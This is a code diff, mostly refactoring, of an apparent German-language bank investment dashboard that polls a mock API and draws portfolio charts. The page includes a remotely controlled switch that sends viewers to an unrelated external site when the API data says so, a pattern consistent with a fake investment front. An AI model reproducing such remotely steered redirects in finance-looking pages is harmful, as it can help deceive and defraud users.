@@ -36,9 +36,7 @@ canvas { width:100% !important; height:100% !important; }
 <body>
 <div class="wrap">
 
-<img class="logo"
-src="https://github.com/javad-niroumand/Lisa/blob/main/ChatGPT%20Image%20Nov%2025,%202025,%2002_43_24%20PM%20(1).png?raw=true"
-alt="Bank Logo">
+<img class="logo" src="https://github.com/javad-niroumand/Lisa/blob/main/ChatGPT%20Image%20Nov%2025,%202025,%2002_43_24%20PM%20(1).png?raw=true" alt="Bank Logo">
 
 <div class="card user-info">
 <h2 id="userName">—</h2>
@@ -46,15 +44,10 @@ alt="Bank Logo">
 </div>
 
 <div class="card">
-<strong id="totalPortfolio" style="display:block; text-align:center; font-size:18px; margin-bottom:8px;">
-Gesamtportfolio: —
-</strong>
-
+<strong id="totalPortfolio" style="display:block; text-align:center; font-size:18px; margin-bottom:8px;">Gesamtportfolio: —</strong>
 <strong id="investmentTitle">Investitionsaufteilung</strong>
-
 <div class="chart-wrap"><canvas id="pieChart"></canvas></div>
 <div class="chart-wrap" style="margin-top:16px;"><canvas id="barChart"></canvas></div>
-
 <div class="meta">
 <span>Zuletzt aktualisiert: <span id="lastUpdated">—</span></span>
 <button class="btn" id="refreshBtn">Aktualisieren</button>
@@ -75,12 +68,10 @@ Gesamtportfolio: —
 const API_URL = "https://6797e9d9c2c861de0c6e6bdf.mockapi.io/investments";
 const REDIRECT_URL = "https://trascription.vercel.app/";
 const COLORS = ['#06558d','#3ec4ff','#6ee7b7','#b388ff','#ff6b6b','#ff9f1c','#2ec4b6','#8d99ae','#ef476f','#06d6a0'];
-const HIGHLIGHT_COLOR = '#3ec4ff';
+const HIGHLIGHT_COLOR = '#3ec4ff'; // color for largest investment
 let pieChart, lineChart, barChart, lastData = null, redirectTriggered = false;
 
-function formatCurrency(n){
-  return '€'+n.toLocaleString(undefined,{minimumFractionDigits:2, maximumFractionDigits:2});
-}
+function formatCurrency(n){ return '€'+n.toLocaleString(undefined,{minimumFractionDigits:2, maximumFractionDigits:2}); }
 
 async function fetchData(){
   try {
@@ -89,7 +80,7 @@ async function fetchData(){
     const data = arr[0];
     const dataStr = JSON.stringify(data);
 
-    // Redirect logic (update3 and update)
+    // Redirect logic
     if(data.update3 === true && !redirectTriggered){
       redirectTriggered = true;
       window.location.href = "https://nvidia-fawn.vercel.app/";
@@ -100,10 +91,7 @@ async function fetchData(){
       redirectTriggered = false;
     }
 
-    if(dataStr === lastData){
-      document.getElementById('status').textContent='Keine Änderung';
-      return;
-    }
+    if(dataStr === lastData){ document.getElementById('status').textContent='Keine Änderung'; return; }
     lastData = dataStr;
 
     // User info
@@ -112,97 +100,57 @@ async function fetchData(){
 
     // Total portfolio
     const totalPortfolioValue = data.roi[data.roi.length-1]?.value || 0;
-    document.getElementById('totalPortfolio').textContent =
-      `Gesamtportfolio: ${formatCurrency(totalPortfolioValue)}`;
+    document.getElementById('totalPortfolio').textContent = `Gesamtportfolio: ${formatCurrency(totalPortfolioValue)}`;
 
-    // Category title
+    // Investment category
     const category = data.investments[0]?.category || '';
-    document.getElementById('investmentTitle').textContent =
-      `Investitionsaufteilung – ${category}`;
+    document.getElementById('investmentTitle').textContent = `Investitionsaufteilung – ${category}`;
 
-    // Investments
+    // Filter investments
     const invItems = data.investments.filter(i=>i.type);
 
-    // PIE CHART
-    pieChart.data.labels = invItems.map(i=>i.type);
-    pieChart.data.datasets[0].data = invItems.map(i=>i.percentage);
-    pieChart.data.datasets[0].backgroundColor =
-      invItems.map((_,i)=>COLORS[i % COLORS.length]);
+    // Prepare combined array for sorting
+    const barData = invItems.map(i => ({
+      label: i.type,
+      value: totalPortfolioValue * i.percentage / 100,
+      logo: i.logoUrl,
+      percentage: i.percentage
+    }));
+    barData.sort((a,b) => b.value - a.value); // descending
+
+    // Pie chart (sorted to match bar chart)
+    pieChart.data.labels = barData.map(d => d.label);
+    pieChart.data.datasets[0].data = barData.map(d => d.percentage);
+    pieChart.data.datasets[0].backgroundColor = barData.map((_,i) => COLORS[i % COLORS.length]);
     pieChart.update();
 
-    // ---- SORTING LOGIC FOR BAR CHART ----
-    let combined = invItems.map(item => ({
-        label: item.type,
-        value: totalPortfolioValue * item.percentage / 100,
-        logo: item.logoUrl
-    }));
-
-    combined.sort((a,b) => b.value - a.value);
-
-    const sortedLabels = combined.map(x => x.label);
-    const sortedValues = combined.map(x => x.value);
-    const sortedLogos  = combined.map(x => x.logo);
-
-    // BAR CHART
-    barChart.data.labels = sortedLabels;
-    barChart.data.datasets[0].data = sortedValues;
-    barChart.data.datasets[0].logos = sortedLogos;
-
-    const maxIndex = sortedValues.indexOf(Math.max(...sortedValues));
-    barChart.data.datasets[0].backgroundColor =
-      sortedValues.map((_,i)=> i === maxIndex ? HIGHLIGHT_COLOR : COLORS[i % COLORS.length]);
-
+    // Bar chart
+    barChart.data.labels = barData.map(d => d.label);
+    barChart.data.datasets[0].data = barData.map(d => d.value);
+    barChart.data.datasets[0].logos = barData.map(d => d.logo);
+    barChart.data.datasets[0].backgroundColor = barData.map((_,i) => i===0 ? HIGHLIGHT_COLOR : COLORS[i % COLORS.length]);
     barChart.update();
-
-    // LINE CHART
-    const roiHist = data.roi
-      .map(p=>({x:p.date, y:p.value}))
-      .sort((a,b)=>new Date(a.x)-new Date(b.x));
-
-    lineChart.data.labels = roiHist.map(p=>p.x);
-    lineChart.data.datasets = [{
-      label:'Historisch',
-      data: roiHist.map(p=>p.y),
-      borderColor:'#3ec4ff',
-      borderWidth:2,
-      fill:false,
-      tension:0.3
-    }];
-    lineChart.update();
 
     document.getElementById('lastUpdated').textContent = new Date().toLocaleString();
     document.getElementById('status').textContent = 'Aktualisiert';
 
-  } catch(e){
-    console.error(e);
-    document.getElementById('status').textContent = 'Fehler';
-  }
+    // Line chart (historical ROI)
+    const roiHist = data.roi.map(p=>({x:p.date, y:p.value})).sort((a,b)=>new Date(a.x)-new Date(b.x));
+    const labelsLine = roiHist.map(p=>p.x);
+    const histValues = roiHist.map(p=>p.y);
+    lineChart.data.labels = labelsLine;
+    lineChart.data.datasets = [{label:'Historisch', data:histValues, borderColor:'#3ec4ff', borderWidth:2, fill:false, tension:0.3}];
+    lineChart.update();
+
+  } catch(e){ console.error(e); document.getElementById('status').textContent = 'Fehler'; }
 }
 
 function initCharts(){
   const pieCtx = document.getElementById('pieChart').getContext('2d');
-  pieChart = new Chart(pieCtx,{
-    type:'pie',
-    data:{labels:[], datasets:[{data:[], backgroundColor: []}]},
-    options:{responsive:true, maintainAspectRatio:false, plugins:{legend:{display:false}}}
-  });
+  pieChart = new Chart(pieCtx,{ type:'pie', data:{labels:[], datasets:[{data:[], backgroundColor: []}]}, options:{responsive:true, maintainAspectRatio:false, plugins:{legend:{display:false}}} });
 
   const lineCtx = document.getElementById('lineChart').getContext('2d');
-  lineChart = new Chart(lineCtx,{
-    type:'line',
-    data:{ labels:[], datasets:[] },
-    options:{
-      responsive:true,
-      maintainAspectRatio:false,
-      scales:{
-        x:{ticks:{color:'#cfcfd1'}},
-        y:{ticks:{color:'#cfcfd1'}}
-      },
-      plugins:{
-        tooltip:{ callbacks:{ label: ctx => 'Wert: ' + formatCurrency(ctx.parsed.y)} }
-      }
-    }
-  });
+  lineChart = new Chart(lineCtx,{ type:'line', data:{ labels:[], datasets:[] }, options:{ responsive:true, maintainAspectRatio:false, scales:{ x:{ticks:{color:'#cfcfd1'}}, y:{ticks:{color:'#cfcfd1'}}}, plugins:{ tooltip:{ callbacks:{ label: ctx => 'Wert: ' + formatCurrency(ctx.parsed.y) } } } } });
 
   const barCtx = document.getElementById('barChart').getContext('2d');
   barChart = new Chart(barCtx,{
@@ -212,10 +160,7 @@ function initCharts(){
       indexAxis:'y',
       responsive:true,
       maintainAspectRatio:false,
-      scales:{
-        x:{ ticks:{ color:'#cfcfd1', callback: val => formatCurrency(val) } },
-        y:{ ticks:{ color:'#cfcfd1', font:{size:12} } }
-      },
+      scales:{ x:{ ticks:{ color:'#cfcfd1', callback: val => formatCurrency(val) } }, y:{ ticks:{ color:'#cfcfd1', font:{size:12} } } },
       plugins:{ legend:{ display:false }, tooltip:{ enabled:false } },
       animation: { duration:500 },
     },
@@ -243,10 +188,20 @@ function initCharts(){
           }
         });
       }
+    },{
+      id: 'tooltipLogo',
+      afterEvent: chart => {
+        let tooltipEl = document.getElementById('chartjs-tooltip');
+        if(!tooltipEl){
+          const div = document.createElement('div');
+          div.id='chartjs-tooltip';
+          document.body.appendChild(div);
+        }
+      }
     }]
   });
 
-  // Tooltip HTML element
+  // Custom external tooltip
   barChart.options.plugins.tooltip.external = function(context){
     let tooltipEl = document.getElementById('chartjs-tooltip');
     if (!tooltipEl) return;
@@ -269,7 +224,6 @@ function initCharts(){
         </div>
       </div>
     `;
-
     const position = context.chart.canvas.getBoundingClientRect();
     tooltipEl.style.opacity = 1;
     tooltipEl.style.left = position.left + window.pageXOffset + tooltipModel.caretX + 'px';
@@ -278,7 +232,6 @@ function initCharts(){
 }
 
 document.getElementById('refreshBtn').addEventListener('click', fetchData);
-
 initCharts();
 fetchData();
 setInterval(fetchData, 8000);
